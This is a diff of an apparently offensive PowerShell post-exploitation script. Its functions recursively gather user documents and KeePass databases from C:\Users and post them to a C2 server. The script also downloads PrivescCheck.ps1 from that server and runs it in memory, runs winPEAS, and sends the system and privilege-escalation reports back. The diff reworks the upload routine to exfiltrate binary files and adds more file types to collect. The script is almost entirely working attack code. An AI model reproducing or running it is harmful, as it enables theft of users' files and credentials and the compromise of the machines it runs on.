@@ -112,7 +112,7 @@ function Invoke-Collection {
     # ----------------------------------------
     # Collect user files and exfiltrate
     # ----------------------------------------
-    $extensions = '*.txt','*.pdf','*.xls','*.xlsx','*.doc','*.docx','*.ini','*.kdbx'
+    $extensions = '*.txt','*.pdf','*.xls','*.xlsx','*.doc','*.docx','*.ini','*.kdbx','*.ps1','*.zip'
     try {
         $files = Get-ChildItem -Path "C:\Users\" -Include $extensions -File -Recurse -ErrorAction SilentlyContinue
         foreach ($file in $files) {
@@ -164,7 +164,18 @@ function Invoke-PrivEsc {
     # Collect and POST systeminfo (for wes-ng)
     # ----------------------------------------
     $sysInfo = systeminfo | Out-String
-    Invoke-FileUpload -C2 $C2 -InputString $sysInfo -Filename "systeminfo_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
+    Invoke-FileUpload -C2 $C2 -InputString $sysInfo -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_systeminfo.txt" | Out-Null
+
+    # ----------------------------------------
+    # Run PrivescCheck.ps1 in-memory → POST separately
+    # ----------------------------------------
+    $privCheck = (New-Object Net.WebClient).DownloadString("http://$($C2)/PrivescCheck.ps1")
+    Invoke-Expression $privCheck
+    $privCheckHtml = Join-Path $tmp "$($env:COMPUTERNAME)_$($env:USERNAME)_PrivescCheck"
+    $privCheckOutput = Invoke-PrivescCheck -Extended -Report $privCheckHtml -Format HTML | Out-String
+    Invoke-FileUpload -C2 $C2 -InputString $privCheckOutput -FileName "$($env:COMPUTERNAME)_$($env:USERNAME)_PrivescCheck.txt" | Out-Null
+    Invoke-FileUpload -C2 $C2 -FilePath "$privCheckHtml.html" | Out-Null
+    Remove-Item "$privCheckHtml.html" -Force
 
     # ----------------------------------------
     # Run winPEAS.exe in memory and exfiltrate output
@@ -188,23 +199,7 @@ function Invoke-PrivEsc {
     [Console]::SetOut([System.IO.StreamWriter]::new([Console]::OpenStandardOutput()))
 
     Invoke-FileUpload -C2 $C2 -InputString $peasOutput -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_winpeas.txt" | Out-Null
-
-    # ----------------------------------------
-    # Run PrivescCheck.ps1 in-memory → POST separately
-    # ----------------------------------------
-    $privCheck = (New-Object Net.WebClient).DownloadString("http://$($C2)/PrivescCheck.ps1")
-    Invoke-Expression $privCheck
-    $privCheckHtml = Join-Path $tmp "$($env:COMPUTERNAME)_$($env:USERNAME)_PrivescCheck"
-    $privCheckOutput = Invoke-PrivescCheck -Extended -Report $privCheckHtml -Format HTML | Out-String
-    Invoke-FileUpload -C2 $C2 -InputString $privCheckOutput -FileName "$($env:COMPUTERNAME)_$($env:USERNAME)_PrivescCheck.txt" | Out-Null
-    Invoke-FileUpload -C2 $C2 -FilePath "$privCheckHtml.html" | Out-Null
-
-    # ----------------------------------------
-    # Cleanup
-    # ----------------------------------------
-    Remove-Item "$privCheckHtml.html" -Force
 }
-
 
 function Invoke-FileUpload {
     param(
@@ -227,6 +222,7 @@ function Invoke-FileUpload {
         $Boundary = [System.Guid]::NewGuid().ToString()
         $LF = "`r`n"
 
+        # prepare content
         if ($PSCmdlet.ParameterSetName -eq "File") {
             if (-not (Test-Path $FilePath)) {
                 Write-Error "File not found: $FilePath"
@@ -234,29 +230,40 @@ function Invoke-FileUpload {
             }
 
             $FileName = [System.IO.Path]::GetFileName($FilePath)
-
-            # Get file owner (domain\user)
             $Owner = (Get-Acl -Path $FilePath).Owner -replace '[\\]', '_'
-
-            # Prepend values to filename: Host_Owner_Filename.ext
             $FileName = "$($env:COMPUTERNAME)_$($Owner)_$($FileName)"
-            $FileContent = Get-Content -Raw -Path $FilePath
+
+            # Read as raw bytes
+            $FileContent = [System.IO.File]::ReadAllBytes($FilePath)
+            $IsBinary = $true
         }
         else {
-            $FileContent = $InputString
+            # treat string as UTF8
+            $FileContent = [System.Text.Encoding]::UTF8.GetBytes($InputString)
+            $IsBinary = $false
         }
 
-        # Build multipart body manually
-        $Body  = "--$Boundary$LF"
-        $Body += "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"$LF"
-        $Body += "Content-Type: text/plain$LF$LF"
-        $Body += $FileContent + $LF
-        $Body += "--$Boundary--$LF"
+        # Build multipart body
+        $preBody  = "--$Boundary$LF"
+        $preBody += "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"$LF"
+        $preBody += "Content-Type: " + ($(if ($IsBinary) { "application/octet-stream" } else { "text/plain" })) + $LF + $LF
+
+        $postBody = "$LF--$Boundary--$LF"
+
+        $enc = [System.Text.Encoding]::ASCII
+        $preBytes  = $enc.GetBytes($preBody)
+        $postBytes = $enc.GetBytes($postBody)
+
+        # Combine into one byte[]
+        $BodyBytes = New-Object byte[] ($preBytes.Length + $FileContent.Length + $postBytes.Length)
+        [System.Buffer]::BlockCopy($preBytes, 0, $BodyBytes, 0, $preBytes.Length)
+        [System.Buffer]::BlockCopy($FileContent, 0, $BodyBytes, $preBytes.Length, $FileContent.Length)
+        [System.Buffer]::BlockCopy($postBytes, 0, $BodyBytes, $preBytes.Length + $FileContent.Length, $postBytes.Length)
 
         # Send request
-        Invoke-WebRequest -Uri $Url -Method Post -Body $Body -ContentType "multipart/form-data; boundary=$Boundary" -UseBasicParsing
+        Invoke-WebRequest -Uri $Url -Method Post -Body $BodyBytes -ContentType "multipart/form-data; boundary=$Boundary" -UseBasicParsing
 
-        if ($FilePath -and (Test-Path $FilePath)) {
+        if ($PSCmdlet.ParameterSetName -eq "File") {
             Write-Host "[*] Uploaded $FilePath as $FileName to $Url"
         }
         else {
@@ -267,3 +274,66 @@ function Invoke-FileUpload {
         Write-Error "Upload failed: $_"
     }
 }
+
+# function Invoke-FileUpload {
+#     param(
+#         [Parameter(ParameterSetName="File", Mandatory=$true)]
+#         [string]$FilePath,
+
+#         [Parameter(ParameterSetName="Direct", Mandatory=$true)]
+#         [string]$InputString,
+
+#         [Parameter(ParameterSetName="Direct", Mandatory=$true)]
+#         [string]$FileName,
+
+#         [Parameter(Mandatory=$true)]
+#         [string]$C2
+#     )
+
+#     try {
+#         # Construct upload URL
+#         $Url = "http://$($C2):8080/p"
+#         $Boundary = [System.Guid]::NewGuid().ToString()
+#         $LF = "`r`n"
+
+#         if ($PSCmdlet.ParameterSetName -eq "File") {
+#             if (-not (Test-Path $FilePath)) {
+#                 Write-Error "File not found: $FilePath"
+#                 return
+#             }
+
+#             $FileName = [System.IO.Path]::GetFileName($FilePath)
+
+#             # Get file owner (domain\user)
+#             $Owner = (Get-Acl -Path $FilePath).Owner -replace '[\\]', '_'
+
+#             # Prepend values to filename: Host_Owner_Filename.ext
+#             $FileName = "$($env:COMPUTERNAME)_$($Owner)_$($FileName)"
+#             # $FileContent = Get-Content -Raw -Path $FilePath
+#             $FileContent = [System.IO.File]::ReadAllBytes($FilePath)
+#         }
+#         else {
+#             $FileContent = $InputString
+#         }
+
+#         # Build multipart body manually
+#         $Body  = "--$Boundary$LF"
+#         $Body += "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"$LF"
+#         $Body += "Content-Type: text/plain$LF$LF"
+#         $Body += $FileContent + $LF
+#         $Body += "--$Boundary--$LF"
+
+#         # Send request
+#         Invoke-WebRequest -Uri $Url -Method Post -Body $Body -ContentType "multipart/form-data; boundary=$Boundary" -UseBasicParsing
+
+#         if ($FilePath -and (Test-Path $FilePath)) {
+#             Write-Host "[*] Uploaded $FilePath as $FileName to $Url"
+#         }
+#         else {
+#             Write-Host "[*] Uploaded $FileName to $Url"
+#         }
+#     }
+#     catch {
+#         Write-Error "Upload failed: $_"
+#     }
+# }
